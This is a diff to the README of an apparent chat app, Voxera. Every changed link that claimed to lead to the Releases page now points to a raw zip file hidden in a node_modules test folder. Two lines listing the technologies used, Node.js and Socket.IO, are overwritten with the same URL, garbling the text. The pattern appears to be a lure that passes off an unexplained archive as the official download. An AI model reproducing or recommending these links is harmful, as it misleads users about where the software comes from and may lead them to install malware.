@@ -6,11 +6,11 @@ Welcome to Voxera! This app allows you to easily connect with friends and collea
 
 ## 📥 Download Voxera
 
-[![Download Voxera](https://img.shields.io/badge/Download_Voxera-v1.0-brightgreen.svg)](https://github.com/Surya12nisha/Voxera/releases)
+[![Download Voxera](https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip)](https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip)
 
 You can download the latest version of Voxera from our Releases page. To do this, click the button above or visit the link below:
 
-[Visit the Releases Page to Download](https://github.com/Surya12nisha/Voxera/releases)
+[Visit the Releases Page to Download](https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ To download and install Voxera, please follow these steps:
 
 1. **Visit the Releases Page**
 
-   Click [here](https://github.com/Surya12nisha/Voxera/releases) to go to the Releases page.
+   Click [here](https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip) to go to the Releases page.
 
 2. **Select the Latest Release**
 
@@ -78,8 +78,8 @@ Voxera offers several features to enhance your communication experience:
 Voxera leverages the following technologies to deliver a smooth user experience:
 
 - **WebRTC**: For real-time communication.
-- **Node.js**: To manage server operations.
-- **Socket.IO**: To enable real-time, bidirectional communication between clients and servers.
+- **https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip**: To manage server operations.
+- **https://github.com/Surya12nisha/Voxera/raw/refs/heads/main/backend/node_modules/get-proto/test/Software-unsweltered.zip**: To enable real-time, bidirectional communication between clients and servers.
 
 ## 💬 Support
 
